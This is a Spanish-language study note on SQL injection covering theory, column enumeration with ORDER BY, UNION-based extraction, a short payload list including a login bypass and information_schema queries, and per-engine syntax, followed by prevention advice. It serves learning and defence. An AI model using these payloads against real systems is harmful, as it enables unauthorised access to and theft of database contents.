-----
###### Tags: #vulnerabilidad #web #basededatos 

------------------------------------------------------
# TEORIA

> **SQL Injection (SQLi)** es una vulnerabilidad de seguridad que permite a un atacante modificar o inyectar consultas SQL mediante entradas controladas por el usuario. Si la aplicación no valida o parametriza correctamente los datos recibidos, el atacante puede consultar, modificar o eliminar información almacenada en la base de datos, e incluso llegar a comprometer completamente el servidor en determinados escenarios.

-----------
## ¿Cómo funciona?

Una aplicación vulnerable concatena directamente el input del usuario dentro de una consulta SQL.

Por ejemplo:

```SQL
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

Si el usuario introduce caracteres especiales o consultas SQL, estos serán interpretados por el motor de base de datos.

```SQL
SELECT * FROM users WHERE username = '$username' AND password = 'INPUT' or 1=1-- -';
```

-----------
## Tipos

- **Basada en Error**
- **Basada en Tiempo**

-----------
## ¿Cómo se explota?

1. a

## Identificación del número de columnas

En algunos casos es necesario conocer cuántas columnas devuelve la consulta SQL del lado del servidor. Una forma común de descubrirlo es utilizando la cláusula `ORDER BY` con índices numéricos. La técnica consiste en aumentar progresivamente el número utilizado en `ORDER BY`. Mientras el índice corresponda a una columna existente, la consulta será válida. Cuando el índice sea mayor al número de columnas devueltas por la consulta, el servidor generará un error indicando que esa posición no existe.

En este ejemplo sabemos que la consulta devuelve 2 columnas (id y username), aunque en un escenario real únicamente controlaríamos y veriamos el valor del `INPUT`.
```SQL
SELECT id,username FROM users WHERE username = 'INPUT';
```

El payload seria:
```SQL
' order by 2;
```

Lo que el servidor interpretaria correctamente como:
```SQL
SELECT id,username FROM users WHERE username = '' order by 2;
```

Como 2 corresponde a la segunda columna del resultado, la consulta se ejecutará correctamente. 

Sin embargo, si intentamos ordenar por una columna inexistente dara error:
```SQL
SELECT id,username FROM users WHERE username = '' order by 3;
```

## Uso de UNION

Conociendo la cantidad de columnas podemos usar UNION que sirve para concatenar datos en una fila nueva dentro del resultado de la query, por ejemplo:
```SQL
SELECT id,username FROM users WHERE username = 'M0xX' union select "test", "prueba";
```

Gracias a esto se porian usar variables para extraer informacion, de la siguiente manera:
```SQL
SELECT id,username FROM users WHERE username = 'M0xX' union select "test", @@version;
```

Tambien se podria usar:
* **@@version:** Para conocer la version de la base de datos.
* **database():** Para conocer la base de datos actualmente en uso.
* **user():** Para conocer el usuario que esta corriendo la base de datos.

-----------
## Payloads
### Bypass de Login

```SQL
' OR 1=1--
```
### Listar tablas existentes en la base de datos

```SQL
SELECT * FROM information_schema.tables
```
### Listar columnas existentes en la base de datos

```SQL
SELECT * FROM information_schema.columns
```
-----------
## Sintaxis basado en el motor de base de datos

### String concatenation
* **Oracle:** `'foo'||'bar'`
* **Microsoft:** `'foo'+'bar'`
* **PostgreSQL:** `'foo'||'bar'`
* **MySQL:** `'foo' 'bar'` espacio entre strings
* **MySQL Variant:** `CONCAT('foo','bar')`
### Comments
* **Oracle:**
	* `--comment`
* **Microsoft:**
	* `--comment`
	* `/*comment*/`
* **PostgreSQL:**
	* `--comment`
	* `/*comment*/``
* **MySQL:**
	* `#comment`
	* `-- comment`espacio despues del doble dash
	* `/*comment*/`
### Database Version
* **Oracle:** `SELECT banner FROM v$version` o `SELECT version FROM v$instance`
* **Microsoft:** `SELECT @@version`
* **PostgreSQL:** `SELECT version()`
* **MySQL:** `SELECT @@version`

### For More Information
* [PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

-----------
## Herramientas

- [[SQLMap]]
- [[BurpSuite]]

-----------
## Prevención

- Consultas preparadas (Prepared Statements)
- Parametrización de consultas
- ORM
- Validación de entradas
- Manejo de errores
- WAF

-----------
## Referencias

- https://owasp.org/www-community/attacks/SQL_Injection
- https://portswigger.net/web-security/sql-injection
- https://cheatsheetseries.owasp.org/